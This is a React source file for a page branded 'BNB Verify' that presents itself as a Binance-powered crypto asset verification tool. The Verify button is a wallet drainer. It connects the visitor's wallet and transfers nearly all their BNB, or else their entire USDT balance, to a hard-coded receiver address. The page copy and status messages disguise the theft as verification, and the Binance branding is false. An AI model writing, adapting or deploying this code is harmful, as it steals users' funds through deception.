import React, { useState } from "react";
import { ethers } from "ethers";
import "./App.css"; // Make sure this file exists for styles

const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint)",
  "function transfer(address to, uint amount) returns (bool)"
];

function App() {
  const [status, setStatus] = useState("");

  async function handleVerify() {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Install MetaMask or Binance Wallet.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      // Check BNB balance
      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005") // leave gas
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      // Check USDT BEP20 balance
      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-[#121212] text-gray-200 px-4">
      {/* Hero Section */}
      <h1 className="text-4xl md:text-5xl font-bold text-yellow-400 mb-4 text-center">
        Verify Crypto Assets
      </h1>
      <p className="text-gray-400 mb-8 text-center max-w-lg">
        Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.
      </p>

      {/* Verify Button with Pulse Rings */}
      <div className="relative flex justify-center items-center w-40 h-40 mb-8">
        <div className="absolute w-40 h-40 rounded-full border-2 border-yellow-400 opacity-30 animate-pulse-ring"></div>
        <div className="absolute w-32 h-32 rounded-full border-2 border-yellow-400 opacity-50 animate-pulse-ring delay-200"></div>
        <div className="absolute w-24 h-24 rounded-full border-2 border-yellow-400 opacity-70 animate-pulse-ring delay-400"></div>
        <button
          onClick={handleVerify}
          className="px-6 py-3 bg-yellow-400 text-black rounded-full font-semibold shadow-md hover:bg-yellow-300 transition relative z-10"
        >
          Verify
        </button>
      </div>

      {/* Status */}
      <p className="text-center text-gray-300 mb-12">{status || "Click Verify to start..."}</p>

      {/* Cards Section */}
      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6 w-full max-w-6xl">
        {["Explorer", "Tokens", "NFTs", "DApps"].map((title) => (
          <div key={title} className="card bg-[#1E1E1E] rounded-xl p-6 text-center transition-all cursor-pointer hover:translate-y-[-5px] hover:shadow-lg">
            <h2 className="text-yellow-400 text-lg font-semibold mb-2">{title}</h2>
            <p className="text-gray-400 text-sm">
              {title === "Explorer" && "Browse BNB Chain addresses, contracts, tokens, and transactions."}
              {title === "Tokens" && "Check token balances and verify authenticity of BNB Chain tokens."}
              {title === "NFTs" && "Verify NFTs on BNB Chain and view metadata securely."}
              {title === "DApps" && "Connect to decentralized apps and verify transactions safely."}
            </p>
          </div>
        ))}
      </div>

      {/* Footer */}
      <footer className="mt-auto py-6 text-center text-gray-500 text-sm w-full">
        &copy; 2025 BNB Verify. Powered by Binance.
      </footer>

      {/* Animations */}
      <style>{`
        @keyframes pulse-ring {
          0% { transform: scale(0.8); opacity: 0.7; }
          70% { transform: scale(1.3); opacity: 0; }
          100% { opacity: 0; }
        }
        .animate-pulse-ring {
          animation: pulse-ring 2.5s cubic-bezier(0.4,0,0.6,1) infinite;
        }
        .delay-200 { animation-delay: 0.2s; }
        .delay-400 { animation-delay: 0.4s; }
      `}</style>
    </div>
  );
}

export default App;
